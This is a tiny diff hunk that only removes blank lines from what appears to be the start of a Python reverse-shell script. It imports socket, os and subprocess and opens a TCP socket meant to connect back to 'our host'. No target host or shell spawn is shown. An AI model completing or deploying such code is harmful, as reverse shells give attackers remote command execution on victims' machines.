@@ -1,5 +1,3 @@
-
-
 import socket,os,subprocess
 #declares the socket properties and connects to our host's socket stream
 supersecret = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
